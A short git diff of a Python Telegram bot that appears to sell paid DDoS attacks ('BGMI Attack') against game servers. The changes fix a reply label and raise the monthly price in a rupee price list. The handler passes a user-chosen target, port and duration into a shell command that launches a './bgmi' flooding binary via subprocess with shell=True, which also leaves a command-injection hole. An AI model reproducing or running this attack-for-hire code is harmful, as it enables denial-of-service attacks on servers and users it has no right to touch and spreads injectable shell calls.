@@ -240,7 +240,7 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 900"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
@@ -324,7 +324,7 @@ Vip 🌟 :
 Pr-ice List💸 :
 Day-->100 Rs
 Week-->400 Rs
-Month-->900 Rs
+Month-->1050 Rs
 Dm: @Mr_offlineYt
 '''
     bot.reply_to(message, response)
